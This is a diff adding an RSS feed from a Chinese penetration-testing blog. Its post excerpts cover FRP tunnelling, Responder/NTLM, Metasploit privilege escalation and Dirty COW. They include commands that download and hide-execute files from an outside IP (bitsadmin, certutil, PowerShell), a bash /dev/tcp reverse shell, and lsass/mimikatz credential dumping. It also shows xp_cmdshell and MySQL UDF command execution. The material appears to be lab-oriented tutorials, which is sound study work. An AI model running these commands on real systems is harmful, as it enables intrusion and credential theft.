@@ -1,0 +1,163 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>intranet on </title>
+    <link>https://wyb0.com/tags/intranet/</link>
+    <description>Recent content in intranet on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 30 Jul 2019 23:27:54 +0800</lastBuildDate>
+    
+	<atom:link href="https://wyb0.com/tags/intranet/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>FRP 内网穿透</title>
+      <link>https://wyb0.com/posts/2019/frp-intranet-through/</link>
+      <pubDate>Tue, 30 Jul 2019 23:27:54 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2019/frp-intranet-through/</guid>
+      <description>0x00 对外提供简单的文件访问服务  服务端  ➜ frp cat frps.ini [common] ; 监听端口 bind_port = 7000 ; 那些端口允许客户端用来映射 allow_ports = 22-80,3000,33389  ➜ frp ./frps -c frps.ini 2019/07/31 00:22:31 [I] [service.go:139] frps tcp listen on 0.0.0.0:7000 2019/07/31 00:22:31 [I] [root.go:204] Start frps success   客户端  C:\Users\Administrator\Desktop\frp&amp;gt;type frpc.ini [common] server_addr = 66.123.35.123 server_port = 7000 [test_static_file] type = tcp ; 文件服务的端口 remote_port = 3000 ; 启用插件 plugin = static_file ; 要对外暴露的文件目录 plugin_local_path = C:\\Users\Administrator\Desktop\frp_file ; 访问 url 中会被去除的前缀，保留的内容即为要访问的文件路径 plugin_strip_prefix = myfile ; 301 认证 plugin_http_user = admin plugin_http_passwd = 123456  C:\Users\Administrator\Desktop\frp&amp;gt;frpc.</description>
+    </item>
+    
+    <item>
+      <title>内网渗透之 Responder 与 Net-NTLM hash</title>
+      <link>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</link>
+      <pubDate>Mon, 10 Sep 2018 09:48:10 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</guid>
+      <description>0x00 一些概念  Windows 认证协议
+分为：基于 NTLM 的认证和基于 kerberos 的认证
+ 什么是 NTLM Hash？
+早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即 NTLM Hash
+ 什么是 Challenge-Response 挑战/响应验证机制？
+ Client 输入 username、password、domain，然后将用户名及密码 hash 后存在本地，并将 username 发送到 DC DC 生成一个 16 字节的随机数，即 Challenge(挑战码)，然后传回 Client Client 收到 Challenge 后将密码 hash 和 challenge 混合 hash，混合后的 hash 称为 response，然后将 challenge、response 和 username 发送给 Server Server 将收到的 3 个值转发给 DC，然后 DC 根据传过来的 username 到域控的账号数据库 ntds.list 找到对应的密码 hash，将 hash 和 Client 传过来的 challenge 混合 hash，将这个混合 hash 与 Client 传过来的 response 进行对比验证  NTLM Hash 与 Net-NTLM Hash</description>
+    </item>
+    
+    <item>
+      <title>Metasploit简单提权</title>
+      <link>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</link>
+      <pubDate>Mon, 26 Feb 2018 13:43:20 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</guid>
+      <description>0x00 前提 虚拟机有一个shell：http://10.11.11.20/a.php，物理机IP是211.222.222.72
+外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195
+0x01 查看主机基本信息 菜刀连接shell，终端执行systeminfo
+C:\Apps\phpStudy\WWW\&amp;gt; systeminfo 主机名: REBER-WIN7 OS 名称: Microsoft Windows 7 专业版 OS 版本: 6.1.7600 ��ȱ Build 7600 OS 制造商: Microsoft Corporation OS 配置: 独立服务器 OS 构件类型: Multiprocessor Free 注册的所有人: reber 注册的组织: 产品 ID: 00371-868-0000007-85272 初始安装日期: 2017/12/26, 7:23:00 系统启动时间: 2018/2/26, 9:52:14 系统制造商: Parallels Software International Inc. 系统型号: Parallels Virtual Platform 系统类型: x64-based PC 处理器: 安装了 1 个处理器。 [01]: Intel64 Family 6 Model 70 Stepping 1 GenuineIntel ~2495 Mhz BIOS 版本: Parallels Software International Inc.</description>
+    </item>
+    
+    <item>
+      <title>Windows终端下载文件和执行远程文件</title>
+      <link>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</link>
+      <pubDate>Tue, 06 Feb 2018 15:12:32 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</guid>
+      <description>环境：Windows Server 2008 R2 Enterprise
+0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe  0x01 certutil下载文件 保存在当前目录
+certutil -urlcache -split -f http://114.115.123.123/a.exe a.exe  有时会下载二进制文件的base64编码后的字符串，然后再解码
+本地：certutil -encode cc.exe base64.txt 目标：certutil -urlcache -split -f http://114.115.123.123/base64.txt 目标：certutil -decode base64.txt cc.exe  文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
+certutil -urlcache -f http://114.115.123.123/a.exe  0x02 powershell下载文件 有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。
+C:&amp;gt;powershell set-executionpolicy unrestricted
+powershell (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.115.123.123/a.exe&amp;quot;,&amp;quot;C:\Windows\Temp\a.exe&amp;quot;) #-w hidden 下载后终端自动退出 powershell -w hidden -c (new-object System.</description>
+    </item>
+    
+    <item>
+      <title>脏牛漏洞</title>
+      <link>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</link>
+      <pubDate>Sat, 22 Oct 2016 00:10:46 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</guid>
+      <description>0x00 测试环境 我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见
+CentOS release 6.5 [reber123@WYB ~]$ uname -a Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux [reber123@WYB ~]$ id uid=502(reber123) gid=502(reber123) groups=502(reber123)  0x01 创建文件 查看文件权限信息，可以看到属主为root，且只读，权限为0404
+[reber123@WYB ~]$ ls -al test -r-----r-- 1 root root 19 Oct 21 00:02 test [reber123@WYB ~]$ cat test this is not a test [reber123@WYB ~]$  0x02 编译、执行poc POC保存为a.c，编译为aaa
+[reber123@WYB ~]$ gcc -lpthread a.c -o aaa [reber123@WYB ~]$ ls aaa a.</description>
+    </item>
+    
+    <item>
+      <title>Metasploit利用workspace进行批量扫描爆破</title>
+      <link>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</link>
+      <pubDate>Tue, 23 Aug 2016 10:05:52 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</guid>
+      <description>0x00 启动 0x01 Metasploit的工作平台 在msf里的工作平台可以保存历史的一些操作信息 0x02 使用db_nmap扫描主机 扫描后的结果会保留在工作平台中，可以用hosts和services进行查看： 0x03 使用msf的模块进行弱口令爆破 注：这里针对ftp服务进行弱口令测试 使用vulns可以查看结果：msf auxiliary(ftp_login) &amp;gt; vulns</description>
+    </item>
+    
+    <item>
+      <title>Ubuntu下安装Metasploit</title>
+      <link>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</link>
+      <pubDate>Thu, 18 Aug 2016 10:38:41 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</guid>
+      <description>0x00 安装Metasploit  下载msfinstall脚本
+$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall  修改文件权限
+$ chmod 755 msfinstall  安装(可能时间较久)
+$ ./msfinstall  更新exp
+$ msfupdate   0x01 连接数据库  首先启动postgresql数据库
+$ /etc/init.d/postgresql start #service postgresql start也可以  初始化MSF数据库(关键步骤)
+$ msfdb init  运行msfconsole
+$ msfconsole  在msf中查看数据库连接状态
+msf &amp;gt; db_status #若出现错误：Module database cache not built yet, using slow search #则重新构建缓存，缓存构建通常需要5-10分钟左右。 #构建完成后，退出Metasploit控制台，然后重新进入即可使用数据库缓存进行搜索模块 msf &amp;gt; db_rebuild_cache   0x02 Metasploit Cheat Sheet 常见命令可以看下 https://www.</description>
+    </item>
+    
+    <item>
+      <title>Linux下系统漏洞提权</title>
+      <link>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</link>
+      <pubDate>Tue, 09 Aug 2016 19:23:13 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</guid>
+      <description>0x00 Linux下的提权 Linux下一般都是系统漏洞提权，分为以下几个步骤：
+1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反弹shell 4. 尝试利用  0x01 提权  获取系统版本号  获取发行版本  cat /etc/*-release cat /etc/issue cat /etc/lsb-release cat /etc/redhat-release  获取内核版本  cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz   根据系统版本号找对应exp  http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules http://securityreason.com http://seclists.org/fulldisclosure http://www.google.com  反弹shell  本地：nc -l -p 8888 目标机器：/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
+    </item>
+    
+    <item>
+      <title>导出Windows主机密码与开启3389</title>
+      <link>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</link>
+      <pubDate>Mon, 08 Aug 2016 08:28:27 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</guid>
+      <description>0x00 导出主机密码hash  关于Windows的hash
+ 早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash Windows hash由LM HASH和NT HASH两部分组成，形式为：用户名称:RID:LM-HASH值:NT-HASH值 存储Windows hash的sam文件位置为：C:\windows\system32\config\SAM  导出hash条件
+ administrator以上权限  导出hash工具
+ wce gethash hashdump SAMInside  上传工具得到hash  在线网站解密hash
+ LM Hash和NT Hash得到一个就可以解密，不过两个都得到的话解密的成功率会更高 可以在http://www.objectif-securite.ch/ophcrack.php解密    0x01 导出主机密码  条件
+ administrator以上权限 当前管理员没有注销登陆(可以通过query user命令看出)  工具
+ mimikatz getpass  上传工具得到密码  导出NTLM Hash本地得到密码
+若 mimikatz 和 getpass 这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密
+ 导出文件 hash 文件
+ 上传 Procdump.exe 导出   Procdump.</description>
+    </item>
+    
+    <item>
+      <title>Windows下第三方服务提权</title>
+      <link>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</link>
+      <pubDate>Sun, 07 Aug 2016 23:38:58 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</guid>
+      <description> 0x00 MSSQL提权 MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权
+提权条件：数据库账号是DBA权限
+ 关于xp_cmdshell
+ 得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell &#39;net user&#39;; 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell &#39;net user&#39;;--  连接数据库  执行系统命令  添加用户  远程连接   0x01 MySQL提权 环境：web应用服务器权限较低
+提权条件：MySQL是system权限
+ 关于UDF  MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。
+ UDF提权过程
+ 导入udf.dll到服务器指定目录
+ MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下
+ MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建  使用SQL语句创建功能函数
+CREATE FUNCTION shell RETURNS STRING SONAME &amp;lsquo;udf.dll&amp;rsquo;; 执行MySQL语句调用新创建的函数
+select shell(&amp;lsquo;cmd&amp;rsquo;,&amp;lsquo;whoami&amp;rsquo;); 删除创建的函数
+drop function shell;  查看基本信息  上传udf提权  添加用户  远程连接   </description>
+    </item>
+    
+    <item>
+      <title>Windows下系统漏洞提权</title>
+      <link>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</link>
+      <pubDate>Sun, 07 Aug 2016 21:31:35 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</guid>
+      <description> 提权是在已经getshell但是权限不大的前提下做的
+0x00 查看基本信息 0x01 使用cmd执行命令  尝试使用cmd执行命令  找可写目录  尝试上传cmd.exe  写一个aspx马  上传cmd.exe  再次尝试使用cmd执行命令   0x02 权限提升  查看未安装补丁
+systeminfo&amp;gt;a.txt&amp;amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644) do @type a.txt|@find /i &amp;quot;%i&amp;quot;||@echo %i Not Installed!)&amp;amp;del /f /q /a a.txt   上传exp提权   0x03 添加用户  添加远程连接用户  0x04 使用3389远程连接 </description>
+    </item>
+    
+  </channel>
+</rss>
